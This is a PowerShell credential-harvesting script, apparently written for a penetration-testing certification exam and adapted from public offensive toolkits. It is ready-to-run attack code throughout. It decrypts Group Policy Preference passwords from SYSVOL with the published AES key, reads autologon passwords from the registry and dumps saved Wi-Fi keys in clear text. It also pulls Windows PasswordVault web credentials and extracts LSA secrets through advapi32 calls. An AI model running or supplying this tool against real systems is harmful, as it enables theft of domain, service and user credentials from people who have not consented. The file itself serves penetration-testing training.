function Search-Local-Passwords
{ 
<#
.SYNOPSIS
This script searches for passwords stored on the local machine in saved wireless profiles, autologin users, and group policy preferences.

.DESCRIPTION
 Performs multiple searches to fetch various forms of stored credentials from a Windows system. Searches for stored / rembered wireless credentials, searches for stored autologin credentials, and stored group policy preference users and credentials. Further, it attempts to decrypt the group policy credentials. Many of the functions here were adopted from other scripts or existing programs. I've done my best to respect all licenses and give credit as possible. All of this work comes from standing on the shoulders of giants.

.PARAMETER wifi
Dumps all credentials and SSIDs for stored wireless networks

.PARAMETER autologin
Fetches the clear text password stored in the regestry for default and alt auto logins

.PARAMETER grouppolicy
Looks for specials passwords and accounts set by the group policy preferences and also decrypts these credentials

.PARAMETER webcreds
Looks for passwords stored in the windows system valut typically for web browsers

.PARAMETER lsasecret
Looks for lsa secrets stored in the windows regestry and decrypts them

.PARAMETER all
Runs all previous specialized searches for credentials!

.EXAMPLE
PS C:\> Search-Local-Passwords -all True
PS C:\> Search-Local-Passwords -webcreds True -wifi True

.LINK
https://github.com/ahhh/PSSE/blob/master/Search-Local-Passwords.ps1
http://lockboxx.blogspot.com/2016/01/search-local-passwords-powershell-for.html
http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1
https://gist.github.com/ahhh/e5dae61873986241ecd6
https://heineborn.com/tech/display-all-saved-wifi-passwords
http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/06/use-powershell-to-decrypt-lsa-secrets-from-the-registry.aspx
https://github.com/samratashok/nishang/blob/master/Gather/Get-LSASecret.ps1

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3061

#>           
	[CmdletBinding()] Param( 
		
		[Parameter(Mandatory = $false)]
		[Alias("w")]
		[String]
		$wifi = $False,
		
		[Parameter(Mandatory = $false)]
		[Alias("a")]
		[String]
		$autologin = $False,
		
		[Parameter(Mandatory = $false)]
		[Alias("g", "gpp")]
		[String]
		$grouppolicy = $False,
		
		[Parameter(Mandatory = $false)]
		[String]
		$webcreds = $False,
		
		[Parameter(Mandatory = $false)]
		[String]
		$lsasecret = $False,
				
		[Parameter(Mandatory = $false)]
		[String]
		$all = $False

	)
	
	# Following code heavily adopted from:
	# https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
	# Author: Chris Campbell (@obscuresec)
	# License: BSD 3-Clause 
	function Get-GPPPassword
	{
		# Some XML issues between versions
		Set-StrictMode -Version 2
    
		# Define helper function that decodes and decrypts password
		function Get-DecryptedCpassword 
		{
			[CmdletBinding()]
			Param ( [string] $Cpassword )
		
			try
			{
				# Append appropriate padding based on string length  
				$Mod = ($Cpassword.length % 4)
			
				switch ($Mod) 
				{
					'1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
					'2' {$Cpassword += ('=' * (4 - $Mod))}
					'3' {$Cpassword += ('=' * (4 - $Mod))}
				}
	
				$Base64Decoded = [Convert]::FromBase64String($Cpassword)
			
				# Create a new AES .NET Crypto Object
				$AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
				[Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
										0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
			
				# Set IV to all nulls to prevent dynamic generation of IV value
				$AesIV = New-Object Byte[]($AesObject.IV.Length) 
				$AesObject.IV = $AesIV
				$AesObject.Key = $AesKey
				$DecryptorObject = $AesObject.CreateDecryptor() 
				[Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
			
				return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
			} 
			catch {Write-Error $Error[0]}
		}  
	
		# Define helper function to parse fields from xml files
		function Get-GPPInnerFields 
		{
			[CmdletBinding()]
			Param ($File)
			
			try 
			{
				$Filename = Split-Path $File -Leaf
				[xml] $Xml = Get-Content ($File)
				# Declare empty arrays
				$Cpassword = @()
				$UserName = @()
				$NewName = @()
				$Changed = @()
				$Password = @()
				# Check for password field
				if ($Xml.innerxml -like "*cpassword*")
				{
					Write-Verbose "Potential password in $File"	
					switch ($Filename) 
					{
						'Groups.xml' 
						{
							$Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
						}
						'Services.xml' 
						{  
							$Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
						}
						'Scheduledtasks.xml' 
						{
							$Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
						}
						'DataSources.xml' 
						{ 
							$Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
						}
						'Printers.xml' 
						{ 
							$Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
						}
						'Drives.xml' 
						{ 
							$Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
							$Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
						}
					}
				}
						
				foreach ($Pass in $Cpassword) 
				{
					Write-Verbose "Decrypting $Pass"
					$DecryptedPassword = Get-DecryptedCpassword $Pass
					Write-Verbose "Decrypted a password of $DecryptedPassword"
					# Append any new passwords to array
					$Password += , $DecryptedPassword
				}
				# Put [BLANK] in variables
				if (!($Password)) {$Password = '[BLANK]'}
				if (!($UserName)) {$UserName = '[BLANK]'}
				if (!($Changed)) {$Changed = '[BLANK]'}
				if (!($NewName)) {$NewName = '[BLANK]'}
				# Create custom object to output results
				$ObjectProperties = @{'Passwords' = $Password;
									'UserNames' = $UserName;
									'Changed' = $Changed;
									'NewName' = $NewName;
									'File' = $File}
					
				$ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
				Write-Verbose "The password is between {} and may be more than one value."
				if ($ResultsObject) {Return $ResultsObject} 
			}
			catch {Write-Error $Error[0]}
		}

		try 
		{
			# Ensure that machine is domain joined and script is running as a domain account
			if ((((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN )) 
			{
				throw 'Machine is not a domain member or User is not a member of the domain.'
			}
		
			# Discover potential files containing passwords ; not complaining in case of denied access to a directory
			Write-Verbose 'Searching the DC. This could take a while.'
			$XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
			if ( -not $XMlFiles ) {throw 'No preference files found.'}
		
			Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
			foreach ($File in $XMLFiles) 
			{
				$Result = (Get-GppInnerFields $File.Fullname)
				Write-Output $Result | Format-List
			}
		}
		catch {Write-Error $Error[0]}
	} # End of Get-GPPPassword

	# Following code heavily adopted from:
	# https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1
	# Author: Will Schroeder (@harmj0y)
	# License: BSD 3-Clause
	function Get-RegAutoLogon 
	{

		[CmdletBinding()] 
		param()
		
		try
		{
			$AutoAdminLogon = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
			Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"
			
			# If enabled fetch all values
			if ($AutoAdminLogon.AutoAdminLogon -ne 0)
			{
				# Fetch default values
				$DefaultDomainName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
				$DefaultUserName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
				$DefaultPassword = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
				if ($DefaultUserName) 
				{
					$out = New-Object System.Collections.Specialized.OrderedDictionary
					$out.add('DefaultDomainName', $DefaultDomainName)
					$out.add('DefaultUserName', $DefaultUserName)
					$out.add('DefaultPassword', $DefaultPassword )
					$out | Format-List
				}
			
				# Fetch alt values
				$AltDefaultDomainName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
				$AltDefaultUserName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
				$AltDefaultPassword = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword
				if ($AltDefaultUserName) 
				{
					$out = New-Object System.Collections.Specialized.OrderedDictionary
					$out.add('AltDefaultDomainName', $AltDefaultDomainName)
					$out.add('AltDefaultUserName', $AltDefaultUserName)
					$out.add('AltDefaultPassword', $AltDefaultPassword )
					$out | Format-List
				}
			}
			else
			{
				$out = "No autologon passwords found!!"
				$out
			}
			
		}
		catch {Write-Error $Error[0]}
	} # End of Get-RegAutoLogon
	
	# Following code heavily adopted from:
	# https://heineborn.com/tech/display-all-saved-wifi-passwords
	function Get-StoredWifiPasswords
	{
		$profiles = netsh wlan show profiles
		$profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-List 
	}
	
	# Following code heavily adopted form:
	# https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
	# Author: Nikhil Mittal (@nikhil_mitt)
	# License: GNU GPL3
	function Get-WebCredentials
	{
		$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
		$VaultObject = new-object Windows.Security.Credentials.PasswordVault
		if ($VaultObject)
		{
			$VaultObject.RetrieveAll() | foreach { $_.RetrievePassword(); $_ | format-list}
		}
		else
		{
			$out = "No PasswordVault creds found!!"
			$out
		}
	}
	
	# Following code heavily adopted form:
	# https://github.com/samratashok/nishang/blob/master/Gather/Get-LSASecret.ps1
	# Author: Nikhil Mittal (@nikhil_mitt)
	# License: GNU GPL3
	function Get-LsaSecret 
	{
		[CmdletBinding()] Param (
		
			[Parameter(Position = 0, Mandatory=$False)]
			[String]
			$RegistryKey
		)
	
		Begin 
		{
			# Check if user is elevated
			$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
			if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) 
			{
				Write-Warning "This function must be run as Administrator"
				Break
			}
		
			# Check if script is run in a 32-bit environment by checking a pointer size
			if([System.IntPtr]::Size -eq 8) 
			{
				Write-Warning "Run PowerShell in 32-bit mode for this function!"
				Break
			}
	
			# Check if RegKey is specified, if not set it to the default secrets location
			if([string]::IsNullOrEmpty($registryKey)) 
			{
				[string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
			}
		
			# Create temporary registry key
			if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) 
			{
				mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
			}
		
			#LSA Secret object structure
			$signature = @"
			[StructLayout(LayoutKind.Sequential)]
			public struct LSA_UNICODE_STRING
			{
				public UInt16 Length;
				public UInt16 MaximumLength;
				public IntPtr Buffer;
			}
			
			[StructLayout(LayoutKind.Sequential)]
			public struct LSA_OBJECT_ATTRIBUTES
			{
				public int Length;
				public IntPtr RootDirectory;
				public LSA_UNICODE_STRING ObjectName;
				public uint Attributes;
				public IntPtr SecurityDescriptor;
				public IntPtr SecurityQualityOfService;
			}
			
			public enum LSA_AccessPolicy : long
			{
				POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
				POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
				POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
				POLICY_TRUST_ADMIN = 0x00000008L,
				POLICY_CREATE_ACCOUNT = 0x00000010L,
				POLICY_CREATE_SECRET = 0x00000020L,
				POLICY_CREATE_PRIVILEGE = 0x00000040L,
				POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
				POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
				POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
				POLICY_SERVER_ADMIN = 0x00000400L,
				POLICY_LOOKUP_NAMES = 0x00000800L,
				POLICY_NOTIFICATION = 0x00001000L
			}
			
			[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
			public static extern uint LsaRetrievePrivateData(
				IntPtr PolicyHandle,
				ref LSA_UNICODE_STRING KeyName,
				out IntPtr PrivateData
			);
			
			[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
			public static extern uint LsaStorePrivateData(
				IntPtr policyHandle,
				ref LSA_UNICODE_STRING KeyName,
				ref LSA_UNICODE_STRING PrivateData
			);
			
			[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
			public static extern uint LsaOpenPolicy(
				ref LSA_UNICODE_STRING SystemName,
				ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
				uint DesiredAccess,
				out IntPtr PolicyHandle
			);
			
			[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
			public static extern uint LsaNtStatusToWinError(
				uint status
			);
			
			[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
			public static extern uint LsaClose(
				IntPtr policyHandle
			);
			
			[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
			public static extern uint LsaFreeMemory(
				IntPtr buffer
			);
"@

			Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
		}
	
		Process
		{
			foreach($key in $RegistryKey) 
			{
				$regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
				$tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
				$myKey = "MySecret"
				if(Test-Path $regPath) 
				{
					Try 
					{
						Get-ChildItem $regPath -ErrorAction Stop | Out-Null
					}
					Catch 
					{
						Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
						Break
					}      
			
					if(Test-Path $regPath) 
					{
						# Copy Key
						"CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object 
						{
							$copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
							$copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_
							if( -not(Test-Path $copyTo) ) { mkdir $copyTo | Out-Null }
							$item = Get-ItemProperty $copyFrom
							Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
						}
					}
					
					$Script:pastevalue
					# objectAttributes
					$objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
					$objectAttributes.Length = 0
					$objectAttributes.RootDirectory = [IntPtr]::Zero
					$objectAttributes.Attributes = 0
					$objectAttributes.SecurityDescriptor = [IntPtr]::Zero
					$objectAttributes.SecurityQualityOfService = [IntPtr]::Zero
			
					# localSystem
					$localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
					$localsystem.Buffer = [IntPtr]::Zero
					$localsystem.Length = 0
					$localsystem.MaximumLength = 0
			
					# secretName
					$secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
					$secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
					$secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
					$secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)
			
					# Get LSA PolicyHandle
					$lsaPolicyHandle = [IntPtr]::Zero
					[LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
					$lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)
			
					if($lsaOpenPolicyHandle -ne 0) 
					{
						Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
						Continue
					}
			
					# Retrieve private data
					$privateData = [IntPtr]::Zero
					$ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)
			
					$lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)
			
					$lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)
			
					if($lsaNtStatusToWinError -ne 0) 
					{
						Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
					}
			
					[LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
					[LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [System.Type][LSAUtil.LSAUtil+LSA_UNICODE_STRING])
			
					Try 
					{
						[string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
						$value = $value.SubString(0, ($lusSecretData.Length / 2))
					}
					Catch 
					{
						$value = ""
					}
			
					if($key -match "^_SC_") 
					{
						# Get Service 
						$serviceName = $key -Replace "^_SC_"
						Try 
						{
							$service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
							$account = $service.StartName
						}
						Catch 
						{
							$account = ""
						}
					} 
					else 
					{
						$account = ""
					}
			
					# Return Object
					$obj = New-Object PSObject -Property @{
						Name = $key;
						Secret = $value;
						Account = $Account
					} 
					$obj | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
				} 
				else 
				{
					Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
				}
			}
		}
		end 
		{
			if(Test-Path $tempRegPath) 
			{
				Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
			}
		}
	}
	
	# Main execution / Switch on options 
	if ($all -eq $True)
	{
		Get-GPPPassword
		Get-RegAutoLogon
		Get-StoredWifiPasswords
		Get-WebCredentials
		Get-LsaSecret
	}
	else
	{
		if ($grouppolicy -eq $True)
		{
			Get-GPPPassword
		}
		if ($autologin -eq $True)
		{
			Get-RegAutoLogon
		}
		if ($wifi -eq $True)
		{
			Get-StoredWifiPasswords
		}
		if ($webcreds -eq $True)
		{
			Get-WebCredentials
		}
		if ($lsasecret -eq $True)
		{
			Get-LsaSecret
		}
		if (($autologin -eq $False) -and ($grouppolicy -eq $False) -and ($wifi -eq $False) -and ($webcreds -eq $False) -and ($lsasecret -eq $False))
		{
			$out = "Please Select 'grouppolicy', 'autologin', 'wifi', 'webcreds', 'Get-LsaSecret' or 'all'!!"
			$out
		}
	}
	
}
